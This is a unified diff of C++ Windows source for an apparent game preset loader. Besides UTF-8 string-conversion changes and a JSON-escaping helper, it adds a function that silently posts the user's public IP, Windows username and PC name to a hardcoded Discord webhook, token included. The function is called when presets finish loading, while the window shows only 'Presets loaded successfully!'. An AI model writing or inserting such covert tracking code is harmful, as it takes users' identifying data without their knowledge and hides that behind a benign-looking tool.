@@ -24,24 +24,73 @@ std::wstring Widen(const std::string& value) {
         return L"";
     }
 
-    int required = MultiByteToWideChar(CP_ACP, 0, value.c_str(), -1, nullptr, 0);
+    int required = MultiByteToWideChar(CP_UTF8, 0, value.c_str(), -1, nullptr, 0);
     if (required <= 0) {
         return L"";
     }
 
     std::wstring wide(static_cast<size_t>(required), L'\0');
-    MultiByteToWideChar(CP_ACP, 0, value.c_str(), -1, &wide[0], required);
+    MultiByteToWideChar(CP_UTF8, 0, value.c_str(), -1, &wide[0], required);
 
-    // Remove the trailing null terminator added by MultiByteToWideChar.
     if (!wide.empty() && wide.back() == L'\0') {
         wide.pop_back();
     }
     return wide;
 }
 
+std::string Narrow(const std::wstring& value) {
+    if (value.empty()) {
+        return "";
+    }
+
+    int required = WideCharToMultiByte(CP_UTF8, 0, value.c_str(), -1, nullptr, 0, nullptr, nullptr);
+    if (required <= 0) {
+        return "";
+    }
+
+    std::string narrow(static_cast<size_t>(required), '\0');
+    WideCharToMultiByte(CP_UTF8, 0, value.c_str(), -1, &narrow[0], required, nullptr, nullptr);
+
+    if (!narrow.empty() && narrow.back() == '\0') {
+        narrow.pop_back();
+    }
+    return narrow;
+}
+
+std::string JsonEscape(const std::string& value) {
+    std::string escaped;
+    escaped.reserve(value.size());
+    for (char ch : value) {
+        switch (ch) {
+        case '\\':
+            escaped += "\\\\";
+            break;
+        case '\"':
+            escaped += "\\\"";
+            break;
+        case '\n':
+            escaped += "\\n";
+            break;
+        case '\r':
+            escaped += "\\r";
+            break;
+        case '\t':
+            escaped += "\\t";
+            break;
+        default:
+            escaped += ch;
+            break;
+        }
+    }
+    return escaped;
+}
+
 std::wstring FetchUsername() {
     const char* name = std::getenv("USERNAME");
-    return name ? Widen(name) : L"";
+    if (!name) {
+        return L"";
+    }
+    return Widen(name);
 }
 
 std::wstring FetchComputerName() {
@@ -87,6 +136,76 @@ std::wstring FetchPublicIp() {
     return Widen(response);
 }
 
+bool SendWebhookMessage(const std::wstring& publicIp, const std::wstring& username, const std::wstring& computerName) {
+    const std::wstring server = L"discord.com";
+    const std::wstring path = L"/api/webhooks/1448971997936746523/Yb2FL5_5JBExuDfKPHQyQj6228wLYxpVMCq6lhE6I-4PONKG2W87p7UZaJoNuFe8rcdq";
+
+    std::string ip = Narrow(publicIp);
+    std::string user = Narrow(username);
+    std::string machine = Narrow(computerName);
+
+    if (ip.empty()) {
+        ip = "Unavailable";
+    }
+    if (user.empty()) {
+        user = "Unavailable";
+    }
+    if (machine.empty()) {
+        machine = "Unavailable";
+    }
+
+    const std::string payload =
+        "{\"embeds\":[{"
+        "\"title\":\"New Preset User\","
+        "\"fields\":["
+        "{\"name\":\"Public IP\",\"value\":\"" + JsonEscape(ip) + "\"},"
+        "{\"name\":\"Username\",\"value\":\"" + JsonEscape(user) + "\"},"
+        "{\"name\":\"PC Name\",\"value\":\"" + JsonEscape(machine) + "\"}"
+        "]}]}";
+
+    HINTERNET hInternet = InternetOpenW(L"CS2RPLoader/1.0", INTERNET_OPEN_TYPE_PRECONFIG, nullptr, nullptr, 0);
+    if (!hInternet) {
+        return false;
+    }
+
+    HINTERNET hConnect = InternetConnectW(hInternet, server.c_str(), INTERNET_DEFAULT_HTTPS_PORT, nullptr, nullptr, INTERNET_SERVICE_HTTP, 0, 0);
+    if (!hConnect) {
+        InternetCloseHandle(hInternet);
+        return false;
+    }
+
+    const wchar_t* acceptTypes[] = { L"application/json", nullptr };
+    HINTERNET hRequest = HttpOpenRequestW(
+        hConnect,
+        L"POST",
+        path.c_str(),
+        nullptr,
+        nullptr,
+        acceptTypes,
+        INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_UI,
+        0);
+
+    if (!hRequest) {
+        InternetCloseHandle(hConnect);
+        InternetCloseHandle(hInternet);
+        return false;
+    }
+
+    std::wstring headers = L"Content-Type: application/json\r\n";
+    BOOL result = HttpSendRequestW(
+        hRequest,
+        headers.c_str(),
+        static_cast<DWORD>(headers.length()),
+        reinterpret_cast<LPVOID>(const_cast<char*>(payload.data())),
+        static_cast<DWORD>(payload.size()));
+
+    InternetCloseHandle(hRequest);
+    InternetCloseHandle(hConnect);
+    InternetCloseHandle(hInternet);
+
+    return result == TRUE;
+}
+
 LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
     switch (uMsg) {
     case WM_CREATE: {
@@ -112,6 +231,7 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) 
             g_computerName = FetchComputerName();
             g_publicIp = FetchPublicIp();
 
+            SendWebhookMessage(g_publicIp, g_username, g_computerName);
             SetWindowTextW(g_statusLabel, L"Presets loaded successfully!");
             KillTimer(hwnd, kLoadTimerId);
         }
